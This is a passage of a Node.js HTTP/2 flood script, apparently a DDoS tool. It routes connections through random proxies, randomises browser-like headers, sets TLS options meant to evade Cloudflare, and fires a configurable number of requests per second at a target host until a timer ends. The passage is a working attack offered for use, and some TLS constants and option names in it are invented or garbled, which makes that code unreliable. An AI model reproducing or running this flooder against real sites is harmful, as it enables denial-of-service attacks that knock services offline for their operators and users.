        's-maxage=' + Math.floor(Math.random() * 86400)
    ];
    return shuffleArray(directives).slice(0, 3).join(', ');
}

function generateAcceptEncoding() {
    const encodings = ['gzip', 'deflate', 'br', 'zstd'];
    return shuffleArray(encodings).join(', ') + (Math.random() > 0.8 ? ', identity' : '');
}

// Utility Functions
function shuffleArray(arr) {
    return arr.sort(() => Math.random() - 0.5);
}

function randomArrayElement(arr) {
    const buf = new Uint32Array(1);
    crypto.getRandomValues(buf);
    return arr[buf[0] % arr.length];
}

////////////////////////////////////////////////////////////////////////////////////////////////////////

function runFlooder() {
  const proxyAddr = randomElement(proxies);
  const parsedProxy = proxyAddr.split(":"); 
      headers["origin"] = "https://" + parsedTarget.host;
      headers[":authority"] = parsedTarget.host
      headers["user-agent"] = moz + az1 + uap1;


  const proxyOptions = {
      host: parsedProxy[0],
      port: ~~parsedProxy[1],
      address: parsedTarget.host + ":443",
      timeout: 100,
  };

  Socker.HTTP(proxyOptions, (connection, error) => {
      if (error) return

      connection.setKeepAlive(true, 600000);

      const tlsOptions = {
         host: parsedTarget.host,
         port: 443,
         secure: true,
         challengesToSolve: Infinity,
         resolveWithFullResponse: true,
         followAllRedirects: true,
         maxRedirects: 10,
         clientTimeout: 5000,
         clientlareMaxTimeout: 10000,
         cloudflareTimeout: 5000,
         cloudflareMaxTimeout: 30000,
         honorCipherOrder: true,
         ALPNProtocols: [
          'h2',
          'http/1.1',
          'spdy/3.1',
          'http/1.2',
          'http/2',
          'http/2+quic/43',
          'http/2+quic/44'
        ],
         secureOptions:  crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION,
         sigals: siga,
         socket: connection,
         ciphers: tls.getCiphers().join(":") + cipper,
         ecdhCurve: "prime256v1:X25519",
         host: parsedTarget.host,
         rejectUnauthorized: false,
         servername: parsedTarget.host,
         secureProtocol: ["TLS_method", "TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
         sessionTimeout: 5000,
     };

      const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

      tlsConn.setKeepAlive(true, 60000);

      const client = http2.connect(parsedTarget.href, {
          protocol: "https:",
          settings: {
         headerTableSize: 65536,
         maxConcurrentStreams: 2000,
         initialWindowSize: 65535,
         maxHeaderListSize: 65536,
         enablePush: false
       },
          maxSessionMemory: 64000,
          maxDeflateDynamicTableSize: 4294967295,
          createConnection: () => tlsConn,
          socket: connection,
      });

      client.settings({
         headerTableSize: 65536,
         maxConcurrentStreams: 2000,
         initialWindowSize: 6291456,
         maxHeaderListSize: 65536,
         enablePush: false
       });

      client.on("connect", () => {
         const IntervalAttack = setInterval(() => {
             for (let i = 0; i < args.Rate; i++) {
                 const request = client.request(headers)
                 
                 .on("response", response => {
                     request.close();
                     request.destroy();
                     return
                 });
 
                 request.end();
             }
         }, 1000); 
      });

      client.on("close", () => {
          client.destroy();
          connection.destroy();
          return
      });
      
      client.on("error", error => {
       client.destroy();
       connection.destroy();
       return
   });
});
}

const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);
